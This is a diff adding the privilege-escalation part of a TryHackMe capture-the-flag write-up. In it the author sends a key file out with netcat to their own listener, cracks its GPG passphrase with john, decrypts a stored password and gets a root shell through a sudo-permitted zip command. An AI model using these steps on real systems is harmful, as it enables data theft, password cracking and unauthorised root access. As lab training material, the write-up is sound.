@@ -121,4 +121,92 @@ THM{stonks}
 ```
 
 ## PrivEsc
+Using the commands on the machine `skyfuck@ubuntu:~$ cat tryhackme.asc | netcat 10.8.150.214 6969` and `❯ nc -lnvp 6969 > tryhackme.asc` on ours, we transfer the files for further inspection.
 
+We do the same for `credentials.pgp`. It looks like we need some passphrase before doing this, so lets do `gpg2john` and then run `john`.
+
+
+```
+❯ gpg2john tryhackme.asc > hash
+
+File tryhackme.asc
+❯ cat hash
+tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
+❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexandru        (tryhackme)
+1g 0:00:00:00 DONE (2021-03-04 23:51) 1.694g/s 1816p/s 1816c/s 1816C/s theresa..alexandru
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+Let's import, this time giving the passphrase
+```
+❯ gpg --import tryhackme.asc
+gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: key 8F3DA3DEC6707170: secret key imported
+gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+```
+
+and now,
+```
+❯ gpg --decrypt cred.pgp
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
+      "tryhackme <stuxnet@tryhackme.com>"
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+```
+
+We are done with the lateral movement!
+
+
+Now, onto `merlin`.
+```
+❯ ssh merlin@10.10.218.100
+merlin@10.10.218.100's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
+merlin@ubuntu:~$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+merlin@ubuntu:~$ 
+```
+
+gtfobins makes it too easy lmao
+```
+merlin@ubuntu:~$ TF=$(mktemp -u)
+merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# ls
+user.txt
+# whoami
+root
+```
+
+we are done!
+```
+# cd /root
+# ls
+root.txt  ufw
+# cat root.txt
+THM{pwned!}
+```
